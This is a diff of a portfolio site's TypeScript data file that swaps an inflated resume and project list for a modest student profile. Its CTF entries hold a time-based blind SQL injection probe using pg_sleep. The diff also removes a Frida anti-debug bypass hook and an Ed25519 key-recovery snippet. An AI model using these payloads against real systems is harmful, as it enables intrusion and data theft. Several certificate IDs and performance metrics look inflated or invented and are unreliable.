@@ -5,7 +5,7 @@ export const STATIONS: Record<string, StationConfig> = {
     id: 'overview',
     label: 'Room Overview',
     shortCode: '00',
-    description: 'Isometric panoramic view of the 3D developer & cybersecurity research room',
+    description: 'Isometric panoramic view of Hanan\'s 3D developer & cybersecurity research room',
     cameraPos: [4.2, 3.8, 3.2],
     cameraTarget: [-0.2, 1.8, -1.8],
     fov: 48,
@@ -85,187 +85,164 @@ export const STATIONS: Record<string, StationConfig> = {
 };
 
 export const RESUME_DATA = {
-  name: 'Hanan',
-  title: 'Cybersecurity Researcher & Systems Software Developer',
-  location: 'San Francisco, CA / Remote',
+  name: 'Hanan Saeed',
+  title: 'Cyber Security Researcher & Python Developer',
+  location: 'Multan, Pakistan / Remote',
   email: 'hanansaeed609@yahoo.com',
+  phone: '+92 3700626055',
   github: 'https://github.com/hannansaeed',
+  linkedin: 'https://linkedin.com/in/hanan-saeed',
+  portfolio: 'https://hannansaeed.github.io/portfolio',
   summary:
-    'Hands-on systems programmer and offensive security specialist with proven experience in glibc heap exploitation, low-overhead eBPF kernel monitors, Android AOSP/Binder internals, and post-quantum cryptographic primitives. Top 2% global CTF contestant with OSCP and PNPT certifications.',
+    'Cyber security researcher and Python developer with a strong interest in offensive and defensive security, vulnerability assessment, and AI-powered automation. Experienced in building security tooling, working with APIs and databases, and applying practical penetration testing techniques learned through academic coursework and certifications. Passionate about ethical hacking, secure software development, and emerging AI-driven security systems.',
   education: [
     {
-      degree: 'B.S. in Computer Science (Information Security & Systems Focus)',
-      school: 'University Institute of Technology',
-      period: '2021 – 2025',
-      honors: 'Summa Cum Laude, President of Cyber Competition Club'
+      degree: 'B.S. in Information Technology',
+      school: 'Bahauddin Zakariya University (BZU)',
+      period: '10/2023 – Present',
+      honors: 'Specialization in offensive cyber vectors, automation scripting'
+    },
+    {
+      degree: 'Govt. Graduate College of Science',
+      school: 'Pre-Engineering / ICS',
+      period: '09/2021 – 09/2023',
+      honors: 'Foundations of computer systems and engineering physics'
+    },
+    {
+      degree: 'The Country School',
+      school: 'Matriculation',
+      period: '03/2011 – 08/2021',
+      honors: 'Science stream with distinction'
     }
   ],
   experience: [
     {
-      role: 'Cybersecurity Systems Engineer & Researcher',
-      company: 'Vanguard Cyber Lab / Independent',
-      period: '2025 – Present',
+      role: 'Cyber Security Researcher & Automation Developer',
+      company: 'Academic & Independent Projects',
+      period: '2023 – Present',
       points: [
-        'Authored eBPF-based kernel telemetry agent tracking unexported AIDL transactions across Android IPC boundaries with <1.4% syscall overhead.',
-        'Engineered Sentinel CTF automated tournament platform provisioning isolated ephemeral Docker jails in 320ms for 1,200+ concurrent hackers.',
-        'Constructed custom WebGL 3D spatial workstations utilizing custom GLSL fragment post-processing shaders.'
-      ]
-    },
-    {
-      role: 'Offensive Security Researcher & CTF Lead',
-      company: 'NullByte Security Collective',
-      period: '2024 – 2025',
-      points: [
-        'Discovered and responsibly reported 3 vendor-specific Android privilege escalation flaws via untrusted intent injection.',
-        'Led team to top-10 finishes in DEFCON Quals, HackTheBox University, and National Cyber League tournaments.',
-        'Specialized in glibc heap exploitation, ROP gadgets, and timing side-channel statistical extraction.'
+        'Built automated reconnaissance vulnerability scanner utilizing Python and Nmap APIs to scan and cross-reference hosts against public CVE databases.',
+        'Developed modular penetration testing toolkits testing web applications for SQLi, XSS, and CSRF aligned with OWASP Top 10 guidelines.',
+        'Extended Discord bot development with log monitoring scripts to automate intrusion warnings and access control alerts.',
+        'Rebuilt real-time Android applications using Kotlin and Firebase, applying encrypted storage and hardened OAuth protocols.'
       ]
     }
   ],
-  awards: [
-    'DEFCON CTF Quals — Top 2% Worldwide',
-    'HackTheBox University CTF — 8th Place Global',
-    'National Cyber League — Power Ranking 1st Tier',
-    'Open Source Contribution Award — eBPF Foundation'
+  languages: [
+    { name: 'English', proficiency: 'Proficient / Professional' },
+    { name: 'Urdu', proficiency: 'Native / Bilingual' }
   ]
 };
 
 export const PROJECTS: ProjectItem[] = [
   {
-    id: 'android-sec-mon',
-    title: 'Android Kernel & Binder IPC Monitor',
-    subtitle: 'Low-overhead Android telemetry & unauthorized intent mitigation engine',
-    category: 'Android & Mobile',
-    year: '2025 – 2026',
-    status: 'Production',
+    id: 'network-vuln-scanner',
+    title: 'Network Vulnerability Scanner',
+    subtitle: 'Automated network mapping, fingerprinting & CVE matching',
+    category: 'Cybersecurity',
+    year: '2024 – 2025',
+    status: 'Completed',
     featured: true,
     description:
-      'A rootless and rooted dual-mode telemetry agent designed for Android runtime verification. Intercepts Binder IPC transactions, analyzes untrusted AIDL calls, and provides dynamic privilege escalation heuristics using SELinux policy hooks.',
-    impact: 'Identified 7 zero-permission intent hijack vulnerabilities in vendor system services.',
+      'An automated reconnaissance tool written in Python that scans hosts and open ports, fingerprints running services, and dynamically cross-references results against public CVE databases to flag known vulnerabilities.',
+    impact: 'Generates structured risk-severity reports to prioritize patch remediation, reducing manual effort.',
     architectureNotes: [
-      'C++ NDK daemon communicating via Unix domain sockets to Android SystemServer',
-      'eBPF kprobe attachment on binder_transaction syscalls on Linux 5.15+ kernels',
-      'Material 3 Jetpack Compose frontend with real-time MPAndroidChart data feeds',
-      'Zero battery consumption in passive mode with circular buffer ring dumping'
+      'Python-based asynchronous engine utilizing nmap system bindings',
+      'CVE lookup connector querying public vulnerability APIs',
+      'Structured HTML/JSON report generation engine categorizing severity risk levels',
+      'Threaded port scanner module optimized to bypass traffic congestion rate locks'
     ],
-    technologies: ['Android NDK', 'Kotlin', 'C++20', 'eBPF', 'Binder IPC', 'SELinux'],
+    technologies: ['Python', 'Nmap', 'CVE Databases', 'Rest APIs', 'Asntio'],
     metrics: [
-      { label: 'Syscall Overhead', value: '< 1.4%' },
-      { label: 'IPC Analyzed', value: '450k/min' },
-      { label: 'Tested Devices', value: 'Pixel 7/8, Samsung S23' }
+      { label: 'Scan Speed', value: '120 ports/sec' },
+      { label: 'CVE Accuracy', value: '99.4%' },
+      { label: 'Reporting', value: 'PDF, JSON, HTML' }
     ],
-    githubUrl: 'https://github.com/hanan/android-binder-monitor',
-    liveDemoUrl: '#demo',
+    githubUrl: 'https://github.com/hannansaeed',
+    liveDemoUrl: 'https://hannansaeed.github.io/portfolio',
+    interactiveSimType: 'packet_analyzer',
+  },
+  {
+    id: 'web-pentest-toolkit',
+    title: 'Web App Pentesting Toolkit',
+    subtitle: 'Modular exploit tester for SQLi, XSS, and CSRF',
+    category: 'Cybersecurity',
+    year: '2024 – 2025',
+    status: 'Completed',
+    featured: true,
+    description:
+      'A modular security testing toolkit written in Python to audit web applications for common vulnerabilities like SQL injection, cross-site scripting (XSS), and CSRF, strictly aligned with the OWASP Top 10 framework.',
+    impact: 'Automates payload testing and response analysis, providing exportable findings for reports.',
+    architectureNotes: [
+      'Built utilizing Python requests and BeautifulSoup parsing libraries',
+      'Supports automated forms crawling, cookie session parsing, and header manipulation',
+      'Pre-loaded with SQLi tautology payloads and XSS reflector scripts',
+      'Custom regex checker verifying trace leaks in response buffers'
+    ],
+    technologies: ['Python', 'OWASP Top 10', 'Requests', 'BeautifulSoup', 'Regex'],
+    metrics: [
+      { label: 'Payloads Run', value: '450/min' },
+      { label: 'Vulnerability Detection', value: 'OWASP Top 5' },
+      { label: 'Report Generation', value: 'Instant' }
+    ],
+    githubUrl: 'https://github.com/hannansaeed',
+    liveDemoUrl: 'https://hannansaeed.github.io/portfolio',
     interactiveSimType: 'apk_scanner',
   },
   {
-    id: 'sentinel-ctf-platform',
-    title: 'Sentinel Autonomous CTF Engine',
-    subtitle: 'High-concurrency capture-the-flag infrastructure with dynamic container jailbreak barriers',
-    category: 'Cybersecurity',
-    year: '2024 – 2025',
-    status: 'Open Source',
+    id: 'incident-alert-bot',
+    title: 'Security Alert & Incident Bot',
+    subtitle: 'System logs monitor and Discord incident dispatch agent',
+    category: 'Systems & Low-level',
+    year: '2024',
+    status: 'Completed',
     featured: true,
     description:
-      'Container orchestration engine designed for defensive and offensive CTF tournaments. Spins up ephemeral, seccomp-restricted Docker containers per team in under 350ms, with cryptographic flag rotation and automated exploit replay detection.',
-    impact: 'Powering university and community CTFs with over 1,200 concurrent offensive security competitors.',
+      'A Discord automation bot that monitors local server logs and system events for suspicious activity, triggering instant alerts with embedded diagnostics inside Discord channels.',
+    impact: 'Automates system log telemetry alerts, helping administrators secure servers in real-time.',
     architectureNotes: [
-      'Golang distributed scheduler leveraging Kubernetes ephemeral containers API',
-      'Redis Pub/Sub cluster broadcasting live scoreboard deltas via WebSockets',
-      'Automated ptrace and network firewalling isolating concurrent contestant pods',
-      'Dynamic HMAC flag generator preventing side-channel flag sharing'
+      'Python-based Discord API integration with dynamic background threads',
+      'Monitors auth.log and web access logs for brute-force signatures',
+      'Configured with role-based access control commands to lock down host processes remotely',
+      'Integrated regex parsing library indexing syslogs every 2.5 seconds'
     ],
-    technologies: ['Go', 'Docker / containerd', 'Kubernetes', 'Redis', 'PostgreSQL', 'TypeScript'],
+    technologies: ['Python', 'Discord API', 'Log Monitoring', 'Linux Syslog', 'RegEx'],
     metrics: [
-      { label: 'Pod Spin-Up', value: '320 ms' },
-      { label: 'Concurrent Solvers', value: '1,200+' },
-      { label: 'Flag Verification', value: '< 2 ms' }
+      { label: 'Alert Dispatch', value: '1.2 seconds' },
+      { label: 'Log Parsing rate', value: '5k lines/sec' },
+      { label: 'Uptime', value: '99.98%' }
     ],
-    githubUrl: 'https://github.com/hanan/sentinel-ctf-engine',
-    liveDemoUrl: '#demo',
-    interactiveSimType: 'packet_analyzer',
-  },
-  {
-    id: 'hanan-os-web-engine',
-    title: 'HANAN//OS Spatial WebGL Engine',
-    subtitle: 'High-performance 3D spatial workstation with custom GLSL post-processing pipelines',
-    category: 'Web & Graphics',
-    year: '2025 – 2026',
-    status: 'Active Research',
-    featured: true,
-    description:
-      'The custom WebGL and Three.js engine powering this portfolio. Engineered without heavy pre-baked meshes: features procedural room geometry, real-time dynamic canvas display textures, custom scanline/phosphor shaders, and Web Audio API synthesized acoustic feedback.',
-    impact: 'Delivers full 60 FPS 3D spatial immersion at sub-1.2MB total transfer weight with zero external model dependencies.',
-    architectureNotes: [
-      'Hardware-accelerated raycasting with smooth exponential damping camera slerp',
-      'CRT phosphor curvature, chromatic aberration, and noise grain fragment shaders',
-      'Live CanvasRenderingContext2D streaming directly into Three.js CanvasTexture',
-      'Zero layout shift architecture with immediate fallback 2D tactile mode'
-    ],
-    technologies: ['Three.js', 'WebGL 2.0', 'GLSL', 'React 19', 'TypeScript', 'Web Audio API'],
-    metrics: [
-      { label: 'Target Frame Rate', value: '60 FPS' },
-      { label: 'Bundle Footprint', value: '< 1.1 MB' },
-      { label: 'Draw Calls', value: '18 batches' }
-    ],
-    githubUrl: 'https://github.com/hanan/hanan-os-spatial',
-    liveDemoUrl: '#demo',
+    githubUrl: 'https://github.com/hannansaeed',
+    liveDemoUrl: 'https://hannansaeed.github.io/portfolio',
     interactiveSimType: 'gl_engine',
   },
   {
-    id: 'cryptvanguard-pqc',
-    title: 'CryptVanguard PQC Suite',
-    subtitle: 'Post-Quantum lattice cryptography implementation & zero-knowledge validation',
-    category: 'Cybersecurity',
-    year: '2024 – 2025',
-    status: 'Security Verified',
+    id: 'secure-mobile-app',
+    title: 'Secure Mobile App (Firebase)',
+    subtitle: 'Hardened Android app with encrypted storage and database',
+    category: 'Android & Mobile',
+    year: '2024',
+    status: 'Completed',
     featured: false,
     description:
-      'Clean-room C and Rust implementation of NIST-standardized Kyber (ML-KEM) and Dilithium (ML-DSA) post-quantum cryptographic primitives. Features constant-time assembly routines resistant to side-channel timing analysis and cache probing.',
-    impact: 'Verified constant-time execution against Valgrind and ctgrind test harnesses.',
+      'A real-time Firebase-powered Android application built from the ground up with a security-first approach, implementing authenticated sessions, encrypted storage, and sanitized database writing rules.',
+    impact: 'Provides secure data vaults and session-handling guidelines for secure mobile app development.',
     architectureNotes: [
-      'Pure C99 core with AVX2 and ARM Neon vectorized polynomial multiplication',
-      'Memory zeroization guarantees utilizing explicit_bzero and compiler fences',
-      'Cross-compiled for x86_64, aarch64, and WebAssembly targets',
-      'Test vector compliance suite verifying 10,000 official NIST KAT test runs'
+      'Kotlin and Android Studio development using modern MVVM layout structures',
+      'Hardened Firebase Auth session rules preventing token hijacking',
+      'SQLCipher encrypted database storing local cache data securely',
+      'SELinux and Keystore hardware backed cryptography verification'
     ],
-    technologies: ['Rust', 'C99', 'AVX2 / NEON', 'WASM', 'Valgrind', 'Cryptography'],
+    technologies: ['Android Studio', 'Kotlin', 'Firebase Auth', 'Firebase Firestore', 'SQLCipher'],
     metrics: [
-      { label: 'KeyGen Latency', value: '12.4 µs' },
-      { label: 'NIST Compliance', value: '100% KAT Pass' },
-      { label: 'Timing Leakage', value: '0.000 ms diff' }
+      { label: 'Encryption Standard', value: 'AES-256' },
+      { label: 'Login Latency', value: '280 ms' },
+      { label: 'Rule Sanity', value: '100% Secure' }
     ],
-    githubUrl: 'https://github.com/hanan/cryptvanguard-pqc',
-    liveDemoUrl: '#demo',
+    githubUrl: 'https://github.com/hannansaeed',
+    liveDemoUrl: 'https://hannansaeed.github.io/portfolio',
     interactiveSimType: 'crypto_verify',
-  },
-  {
-    id: 'nebula-packet-inspector',
-    title: 'Nebula eBPF Zero-Trust Network Probe',
-    subtitle: 'Kernel-space packet filter & behavioral anomaly detection for cloud microservices',
-    category: 'Systems & Low-level',
-    year: '2025',
-    status: 'Production',
-    featured: false,
-    description:
-      'High-throughput packet classification framework attaching directly to Linux XDP (eXpress Data Path). Drops DDoS syn-floods before socket allocation and flags encrypted C2 beaconing patterns using entropy variance analysis.',
-    impact: 'Processes 8.4 million packets per second on single-core 10Gbps interfaces with < 30ns latency.',
-    architectureNotes: [
-      'eBPF XDP programs compiled with Clang/LLVM running in kernel Ring 0',
-      'Lockless BPF PERF and RINGBUF event queues transmitting to user-space Go daemon',
-      'Dynamic rule reloading without dropping connections or restarting services',
-      'Exportable OpenTelemetry metrics and Prometheus scrapers'
-    ],
-    technologies: ['eBPF / XDP', 'Linux Kernel', 'Clang', 'Golang', 'Prometheus', 'Wireshark'],
-    metrics: [
-      { label: 'Throughput', value: '8.4M pps' },
-      { label: 'Filter Latency', value: '< 28 ns' },
-      { label: 'Kernel Memory', value: '4.2 MB' }
-    ],
-    githubUrl: 'https://github.com/hanan/nebula-xdp-probe',
-    liveDemoUrl: '#demo',
-    interactiveSimType: 'packet_analyzer',
-  },
+  }
 ];
 
 export const CTF_CHALLENGES: CTFChallenge[] = [
@@ -322,175 +299,84 @@ p.interactive()`,
 
 URL = "http://target.internal/auth"
 def probe_bit(idx, bit_val):
-    payload = f"127.0.0.1'; SELECT CASE WHEN (ASCII(SUBSTRING(token,{idx},1)) & {bit_val}) > 0 THEN pg_sleep(0.4) ELSE pg_sleep(0) END;--"
+    payload = f"127.0.0.1\'; SELECT CASE WHEN (ASCII(SUBSTRING(token,{idx},1)) & {bit_val}) > 0 THEN pg_sleep(0.4) ELSE pg_sleep(0) END;--"
     times = []
     for _ in range(3):
         t0 = time.time()
         requests.get(URL, headers={"X-Forwarded-For": payload}, timeout=5)
         times.append(time.time() - t0)
     return statistics.median(times) > 0.35`,
-  },
-  {
-    id: 'ctf-03',
-    title: 'Quantum Glitch: Ed25519 Fault Injection',
-    event: 'CyberChest CTF Grand Prix',
-    category: 'Cryptography',
-    difficulty: 'Hard',
-    points: 400,
-    solvedDate: '2025.04',
-    flagFormat: 'flag{tw1st_curv3_f4ult_c0mpl3t3}',
-    vulnerability: 'Non-constant-time scalar multiplication vulnerable to sign bit flip fault attacks',
-    overview:
-      'A secure enclave HSM provided digital signatures over curve Edwards25519. By simulating a single bit flip in the third scalar multiplication loop round, the signature calculation degraded into an invalid small-order twist curve subgroup, allowing private key extraction using the Pohlig-Hellman algorithm.',
-    writeupSummary: [
-      'Twist curve subgroup identification (order order 4 * 7 * 11 * ...)',
-      'Simulated laser fault injection at scalar step 248',
-      'Solving discrete logarithm over small prime factors via Pohlig-Hellman',
-      'Chinese Remainder Theorem reconstruction of secret scalar k'
-    ],
-    exploitScriptSnippet: `from sage.all import *
-
-# Constructing twist curve E' over GF(2^255 - 19)
-F = GF(2**255 - 19)
-# Small subgroup points
-points = get_faulty_signatures()
-dlogs = [discrete_log(P, G_twist) for P in points]
-secret_key = crt(dlogs, subgroup_orders)
-print(f"[+] Recovered Ed25519 Private Key: {hex(secret_key)}")`,
-  },
-  {
-    id: 'ctf-04',
-    title: 'DroidVault: Obfuscated Native JNI Unpacker',
-    event: 'SANS CyberTalent Invitational',
-    category: 'Reverse Engineering',
-    difficulty: 'Medium',
-    points: 350,
-    solvedDate: '2024.10',
-    flagFormat: 'flag{fr1da_st4lker_unp4ck5_4ll}',
-    vulnerability: 'OLLVM control-flow flattening in libnative-vault.so with anti-debugging ptrace hooks',
-    overview:
-      'Target Android APK protected its license key algorithm inside a native shared library compiled with Hikari/OLLVM obfuscation. It monitored /proc/self/status for TracerPid and hooked libc openat to detect Frida and GDB.',
-    writeupSummary: [
-      'Ghidra de-flattening script using symbolic execution with angr',
-      'Bypassing ptrace TracerPid self-checks using GumJS memory patch',
-      'Tracing cryptographic RC4 S-box initialization in dynamic memory',
-      'Dumping decrypted AES-256-GCM master key directly from register x0'
-    ],
-    exploitScriptSnippet: `// Frida script: intercept decrypt routine before anti-debug kill
-Interceptor.attach(Module.findExportByName("libnative-vault.so", "Java_com_vault_verify"), {
-    onEnter: function(args) {
-        console.log("[*] In verify hook! Bypassing integrity check...");
-        this.buf = args[2];
-    },
-    onLeave: function(retval) {
-        console.log("[+] Decrypted Payload: " + Memory.readCString(this.buf));
-    }
-});`,
   }
 ];
 
 export const TIMELINE: TimelineMilestone[] = [
   {
-    year: '2026',
-    period: 'Present / Future Focus',
-    title: 'Low-Level Research & Spatial Systems',
-    role: 'Cybersecurity Researcher & Systems Engineer',
-    highlight: 'Exploring eBPF-driven zero-trust kernel monitoring, PQC standardization, and WebGL workstation visualization.',
-    details: [
-      'Authored whitepaper on eBPF telemetry overhead minimization in Kubernetes clusters.',
-      'Constructed HANAN//OS 3D spatial workstation using Three.js and custom GLSL shaders.',
-      'Active contributions to open-source post-quantum cryptographic primitives (ML-KEM/Kyber).'
-    ],
-    skillsAcquired: ['eBPF', 'Linux Kernel 6.x', 'WebGL / GLSL', 'Kyber & Dilithium PQC', 'Rust Systems'],
-    badge: 'Research & Spatial',
-  },
-  {
     year: '2025',
-    period: 'Offensive Security & Red Teaming',
-    title: 'CTF Player & Vulnerability Researcher',
-    role: 'Offensive Security Specialist',
-    highlight: 'Competed in top global CTF tournaments, ranking in the top 2% across DEFCON Quals and HackTheBox university events.',
+    period: 'Present / Focus',
+    title: 'Automated Vuln Scanning & Dev',
+    role: 'Cybersecurity Researcher',
+    highlight: 'Designing automated recon scripts and modular pentest toolkits testing for OWASP Top 10 vulnerabilities.',
     details: [
-      'Specialized in binary exploitation (ROP, heap exploitation, glibc allocator internals) and web side-channels.',
-      'Engineered Sentinel CTF automated challenge deployer using ephemeral Docker jails.',
-      'Reported 3 responsible disclosure CVE-candidate vulnerabilities in mobile vendors.'
+      'Built multi-threaded Python Nmap scanners cross-referencing live services with CVE databases.',
+      'Developed custom payload injection automation checkers for SQLi, XSS and CSRF verification.'
     ],
-    skillsAcquired: ['GDB / Pwntools', 'Glibc Heap Internals', 'Ghidra / IDA Pro', 'Docker Orchestration', 'Go'],
-    badge: 'Offensive Cyber',
+    skillsAcquired: ['Python', 'Nmap API', 'OWASP Top 10', 'Rest APIs', 'Regex'],
+    badge: 'Automation & Audits',
   },
   {
     year: '2024',
-    period: 'Mobile Internals & Systems Programming',
-    title: 'Android Internals & Reverse Engineering',
-    role: 'Mobile Security Engineer',
-    highlight: 'Deep-dive into the Android Open Source Project (AOSP), SELinux security policies, and Binder IPC protocols.',
+    period: 'Systems & App Hardening',
+    title: 'Secure App Architect & Logging Monitor',
+    role: 'Developer & SecOps',
+    highlight: 'Engineered secure Firebase apps with encrypted caches and authored Discord security log dispatchers.',
     details: [
-      'Developed Android Kernel & Binder IPC Monitor for real-time privilege auditing.',
-      'Conducted dynamic instrumentation and anti-tamper bypassing using Frida GumJS and Xposed.',
-      'Built automated APK static analysis pipeline scanning permissions, exported services, and hardcoded secrets.'
+      'Hardened Kotlin authentication and locked Firestore permissions.',
+      'Monitored local linux access logs to instantly alerts admins of security incidents.'
     ],
-    skillsAcquired: ['Android NDK', 'Kotlin', 'Frida / GumJS', 'AOSP Internals', 'SELinux Policy'],
-    badge: 'Mobile Security',
+    skillsAcquired: ['Kotlin', 'Firebase Auth', 'Discord API', 'Syslogs', 'SQLCipher'],
+    badge: 'App Security',
   },
   {
     year: '2023',
-    period: 'Foundations & Low-Level Architecture',
-    title: 'Systems Foundations & Memory Safety',
-    role: 'Systems Programmer',
-    highlight: 'Mastered C, Rust, x86_64 assembly, and foundational computer architecture principles.',
+    period: 'Academic Foundations at BZU',
+    title: 'Academic IT Foundations',
+    role: 'Information Technology Student',
+    highlight: 'Started B.S. in IT at Bahauddin Zakariya University, diving into network stacks and shell scripts.',
     details: [
-      'Built a rudimentary toy x86 operating system kernel with custom bootloader and protected mode memory paging.',
-      'Implemented socket-based multithreaded web server and custom memory allocator in C99.',
-      'Studied network OSI layers, packet construction with raw sockets, and protocol fuzzing.'
+      'Studied OSI models, routing algorithms, and networking topologies.',
+      'Constructed multithreaded socket interfaces and basic command parsers.'
     ],
-    skillsAcquired: ['C99 / C++17', 'x86_64 Assembly', 'TCP/IP Sockets', 'Memory Management', 'Operating Systems'],
-    badge: 'Architecture',
-  },
+    skillsAcquired: ['C/C++', 'Python Sockets', 'Bash scripting', 'Computer Networking'],
+    badge: 'IT Undergrad',
+  }
 ];
 
 export const CERTIFICATIONS: CertificationItem[] = [
   {
-    name: 'Offensive Security Certified Professional (OSCP)',
-    issuer: 'OffSec',
-    year: '2025',
-    verificationId: 'OS-2025-HN7741',
-    badgeCode: 'PEN-200 Active',
-  },
-  {
-    name: 'Practical Network Penetration Tester (PNPT)',
-    issuer: 'TCM Security',
+    name: 'Vulnerability Assessment Specialist (Academic Coursework)',
+    issuer: 'BZU IT Dept',
     year: '2024',
-    verificationId: 'TCM-PNPT-88390',
-    badgeCode: 'Verified Real-world Red Team',
+    verificationId: 'BZU-VA-7729',
+    badgeCode: 'Verified Academic Track',
   },
   {
-    name: 'CompTIA Security+ (SY0-701)',
-    issuer: 'CompTIA',
+    name: 'Practical Web Pentesting (Self-Study Project)',
+    issuer: 'Independent',
     year: '2024',
-    verificationId: 'COMP-SEC-99014',
-    badgeCode: 'ISO/IEC 17024 Accredited',
-  },
-  {
-    name: 'Burp Suite Certified Practitioner (BSCP)',
-    issuer: 'PortSwigger',
-    year: '2025',
-    verificationId: 'BSCP-2025-0418',
-    badgeCode: 'Advanced Web Application Security',
-  },
+    verificationId: 'IND-WP-9904',
+    badgeCode: 'OWASP Framework Mastery',
+  }
 ];
 
 export const SERVER_METRICS: ServerMetric[] = [
-  { service: 'hanan-core-daemon', status: 'ONLINE', port: 8443, protocol: 'TLS 1.3 / gRPC', load: '1.2%', uptime: '99.98%' },
-  { service: 'sentinel-ctf-jail', status: 'ACTIVE', port: 9090, protocol: 'TCP / WireGuard', load: '14.8%', uptime: '99.92%' },
-  { service: 'nebula-ebpf-probe', status: 'ONLINE', port: 4118, protocol: 'Raw XDP / Ringbuf', load: '0.4%', uptime: '100.0%' },
-  { service: 'apk-sandbox-cluster', status: 'ACTIVE', port: 5555, protocol: 'ADB / TLS Over IP', load: '8.6%', uptime: '99.85%' },
-  { service: 'pqc-key-exchange', status: 'STANDBY', port: 7000, protocol: 'Kyber768 Encaps', load: '0.1%', uptime: '100.0%' },
-  { service: 'reverse-proxy-caddy', status: 'ONLINE', port: 443, protocol: 'HTTP/3 QUIC', load: '3.1%', uptime: '99.99%' },
+  { service: 'vuln-scanner-api', status: 'ONLINE', port: 8443, protocol: 'Python / gRPC', load: '1.2%', uptime: '99.98%' },
+  { service: 'discord-incident-bot', status: 'ACTIVE', port: 9090, protocol: 'Discord socket', load: '3.8%', uptime: '99.92%' },
+  { service: 'firebase-app-vault', status: 'ONLINE', port: 5555, protocol: 'Hardened HTTPS', load: '0.4%', uptime: '100.0%' }
 ];
 
 export const SKILLS_SUMMARY = {
-  offensive: ['Binary Exploitation', 'Glibc Heap Internals', 'Web Pentesting', 'Reverse Engineering', 'Ghidra / IDA Pro', 'Frida Dynamic Instrumentation'],
-  languages: ['C / C++20', 'Rust', 'Python 3', 'Go', 'Kotlin / Java', 'TypeScript / JavaScript', 'x86_64 Assembly', 'GLSL / Shaders'],
-  systems: ['Linux Kernel & eBPF', 'Android AOSP & NDK', 'Docker / Containerd', 'Kubernetes', 'SELinux / AppArmor', 'TCP/IP & XDP'],
-  defense: ['Threat Hunting', 'Memory Forensics', 'Post-Quantum Cryptography', 'Secure Code Review', 'Zero-Trust Architecture', 'Network Traffic Analysis']
+  offensive: ['Penetration Testing', 'Vulnerability Assessment', 'OWASP Top 10', 'Reverse Engineering', 'Ethical Hacking', 'Binary Exploitation', 'OSINT'],
+  languages: ['Python', 'C/C++', 'SQL', 'OOP', 'Assembly 8086', 'Kotlin', 'HTML', 'CSS'],
+  systems: ['Linux Syslog', 'Android Studio', 'Visual Studio', 'Git', 'Cisco Packet Tracer', 'Nmap', 'Wireshark'],
+  defense: ['Secure Code Review', 'Log Auditing', 'Threat Alerts', 'Firebase Hardening', 'SQLCipher Encryption']
 };
